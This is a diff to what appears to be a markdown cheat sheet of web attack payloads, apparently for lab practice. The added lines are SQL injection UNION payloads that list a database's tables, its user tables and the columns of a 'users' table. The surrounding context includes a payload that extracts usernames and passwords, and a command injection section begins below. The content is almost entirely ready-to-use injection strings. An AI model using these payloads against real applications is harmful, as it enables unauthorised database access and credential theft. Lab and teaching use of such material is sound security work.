@@ -78,9 +78,17 @@ etc.
 
 `‘ UNION ALL SELECT user, password FROM example.users #`
 
-* Display all tables in information_schema database:
+* Display all tables in a database:
 
-`%' and 1=0 union select null, table_name from information_schema.tables #`
+`%' and 1=0 union select null, table_name from [database name].tables #`
+
+* Display all the user tables in a database:
+
+`%' and 1=0 union select null, table_name from [database name].tables where table_name like 'user%'#`
+
+* Display all the columns fields in database's user table:
+
+%' and 1=0 union select null, concat(table_name,0x0a,column_name) from information_schema.columns where table_name = 'users' #`
 
 
 COMMAND INJECTION
